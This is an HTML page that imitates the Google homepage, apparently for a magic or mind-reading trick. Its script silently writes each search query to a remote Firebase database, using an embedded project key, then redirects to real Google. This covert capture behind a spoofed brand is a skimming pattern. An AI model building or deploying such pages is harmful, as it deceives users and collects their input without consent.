<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: Roboto, arial, sans-serif; background: #fff; color: #202124; display: flex; flex-direction: column; height: 100vh; justify-content: space-between; }
        header { display: flex; justify-content: flex-end; align-items: center; padding: 15px 30px; font-size: 13px; }
        header a { color: rgba(0,0,0,0.87); text-decoration: none; margin-left: 15px; }
        header a:hover { text-decoration: underline; }
        .sign-in-btn { background: #1a73e8; color: white !important; padding: 9px 23px; border-radius: 4px; font-weight: 500; text-decoration: none !important; }
        
        main { display: flex; flex-direction: column; align-items: center; margin-top: 80px; flex-grow: 1; }
        .logo { margin-bottom: 25px; }
        
        .search-container { width: 90%; max-width: 584px; position: relative; }
        .search-box { width: 100%; height: 46px; border: 1px solid #dfe1e5; border-radius: 24px; padding: 0 45px 0 45px; font-size: 16px; outline: none; box-shadow: none; transition: box-shadow 200ms; }
        .search-box:hover, .search-box:focus { box-shadow: 0 1px 6px rgba(32,33,36,0.28); border-color: rgba(223,225,229,0); }
        
        .search-icon { position: absolute; left: 14px; top: 13px; fill: #9aa0a6; width: 20px; height: 20px; }
        .mic-icon { position: absolute; right: 16px; top: 12px; width: 24px; height: 24px; cursor: pointer; }

        .buttons { margin-top: 28px; display: flex; gap: 12px; }
        .btn { background-color: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px; color: #3c4043; font-size: 14px; padding: 10px 16px; cursor: pointer; user-select: none; }
        .btn:hover { border: 1px solid #dadce0; color: #202124; box-shadow: 0 1px 1px rgba(0,0,0,0.1); }
        
        .languages { font-size: 13px; margin-top: 28px; color: #4d5156; }
        .languages a { color: #1a0dab; text-decoration: none; margin: 0 3px; }
        .languages a:hover { text-decoration: underline; }

        footer { background: #f2f2f2; color: #70757a; font-size: 14px; }
        .location { padding: 15px 30px; border-bottom: 1px solid #dadce0; }
        .footer-links { display: flex; flex-wrap: wrap; justify-content: space-between; padding: 15px 30px; }
        .footer-links a { color: #70757a; text-decoration: none; margin-right: 30px; }
        .footer-links a:hover { text-decoration: underline; }
    </style>
</head>
<body>

    <header>
        <a href="#">Gmail</a>
        <a href="#">Images</a>
        <a href="#" class="sign-in-btn">Sign in</a>
    </header>

    <main>
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x91dp.png" alt="Google" width="272" height="91">
        </div>

        <div class="search-container">
            <svg class="search-icon" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
            <input type="text" id="searchInput" class="search-box" autocomplete="off" autofocus>
            <svg class="mic-icon" viewBox="0 0 24 24"><path fill="#4285f4" d="m12 15c1.66 0 3-1.34 3-3v-6c0-1.66-1.34-3-3-3s-3 1.34-3 3v6c0 1.66 1.34 3 3 3z"/><path fill="#34a853" d="m11 18.08h2v3h-2z"/><path fill="#fbbc05" d="m7.05 16.87c-1.27-1.27-2.05-3.02-2.05-4.95h-2c0 2.48 1 4.73 2.63 6.37z"/><path fill="#ea4335" d="m12 17c-2.76 0-5-2.24-5-5h-2c0 3.53 2.61 6.43 6 6.92v2.08h2v-2.08c3.39-.49 6-3.39 6-6.92h-2c0 2.76-2.24 5-5 5z"/></svg>
        </div>

        <div class="buttons">
            <button class="btn" onclick="performSearch()">Google Search</button>
            <button class="btn" onclick="performSearch()">I'm Feeling Lucky</button>
        </div>

        <div class="languages">
            Google offered in: 
            <a href="#">മലയാളം</a>
            <a href="#">हिन्दी</a>
            <a href="#">தமிழ்</a>
            <a href="#">తెలుగు</a>
        </div>
    </main>

    <footer>
        <div class="location">India</div>
        <div class="footer-links">
            <div>
                <a href="#">About</a>
                <a href="#">Advertising</a>
                <a href="#">Business</a>
                <a href="#">How Search works</a>
            </div>
            <div>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Settings</a>
            </div>
        </div>
    </footer>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCGy1QcZfvh4SoEdcVcSGl-_jdSCagH4sE",
            authDomain: "magicapp-7c8e1.firebaseapp.com",
            databaseURL: "https://magicapp-7c8e1-default-rtdb.firebaseio.com",
            projectId: "magicapp-7c8e1",
            storageBucket: "magicapp-7c8e1.appspot.com",
            messagingSenderId: "26285258962",
            appId: "1:26285258962:web:c94661ee24dbf5cd35550b"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        function performSearch() {
            const query = document.getElementById('searchInput').value.trim();
            if (query !== "") {
                database.ref('magic/thought').set(query.toUpperCase() + "_" + Date.now());
                
                setTimeout(() => {
                    window.location.href = "https://www.google.com/search?q=" + encodeURIComponent(query);
                }, 400);
            }
        }

        document.getElementById("searchInput").addEventListener("keypress", function(event) {
            if (event.key === "Enter") {
                performSearch();
            }
        });
    </script>
</body>
</html>
